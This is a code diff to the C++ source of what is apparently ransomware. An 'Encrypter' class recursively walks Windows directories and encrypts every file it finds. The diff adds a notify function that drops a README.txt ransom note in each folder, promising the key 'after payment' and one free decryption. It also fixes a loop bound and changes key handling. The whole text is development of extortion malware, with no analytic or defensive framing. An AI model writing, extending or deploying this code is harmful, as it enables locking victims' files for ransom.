@@ -21,7 +21,7 @@ bool isValidFile(char* file) {
   if (ext == NULL) return false;
   ext++;
   bool res = false;
-  for (int i = 0; i < (int)sizeof(extensions) && !res; i++)
+  for (int i = 0; i < (int)sizeof(extensions) - 1 && !res; i++)
     res = strcmp(ext, extensions[i]) == 0;
   return res;
 }
@@ -139,8 +139,22 @@ void Encrypter::decryptFile(char* fname) {
   printf("File Decrypted!\n");
 }
 
-void Encrypter::generateKey(char* &id, unsigned int &len) {
+void Encrypter::generateKey() {
   key = advandedRNG(id, len, time(NULL) ^ clock());
+}
+
+void Encrypter::notify(const char* sPath) {
+  char path[512];
+  sprintf(path, "%s\\%s", sPath, "README.txt");
+  FILE* idfile = fopen(path, "w");
+
+  const char* buffer = "After payment, use the next id to generate your key: ";
+  fwrite(buffer, sizeof(char), strlen(buffer), idfile);
+  fwrite(id, sizeof(uint8_t), len, idfile);
+  buffer = "\nYou can also use it to decrypt one file for free!\n";
+  fwrite(buffer, sizeof(char), strlen(buffer), idfile);
+
+  fclose(idfile);
 }
 
 void Encrypter::encrypt(const char* sDir) {
@@ -150,22 +164,20 @@ void Encrypter::encrypt(const char* sDir) {
   HANDLE hFind = FindFirstFile(sPath, &fdFile);
   do {
     if (strcmp(fdFile.cFileName, ".") != 0 && strcmp(fdFile.cFileName, "..") != 0) {
-      // Build up file path
       sprintf(sPath, "%s\\%s", sDir, fdFile.cFileName);
-      // Is it a file or folder?
       if (fdFile.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
-        this->encrypt(sPath); // Recursion
-      else {
-        this->encryptFile(sPath);
-        // Add .txt with user ID
-      }
+        this->encrypt(sPath); // Folder
+      else
+        this->encryptFile(sPath); // File
     }
   } while (FindNextFile(hFind, &fdFile)); // Find the next file
   FindClose(hFind); // Clean
+  this->notify(sDir);
 }
 
 void Encrypter::decrypt(const char* sDir, uint8_t* decrypt_key) {
-  key = decrypt_key;
+  if (key == NULL)
+    key = decrypt_key;
   char sPath[512];
   sprintf(sPath, "%s\\*.*", sDir); // Search all files
   WIN32_FIND_DATA fdFile;
@@ -182,7 +194,6 @@ void Encrypter::decrypt(const char* sDir, uint8_t* decrypt_key) {
     }
   } while (FindNextFile(hFind, &fdFile)); // Find the next file
   FindClose(hFind); // Clean
-  this->destroyKey();
 }
 
 unsigned int Encrypter::getCantEncrypted() {
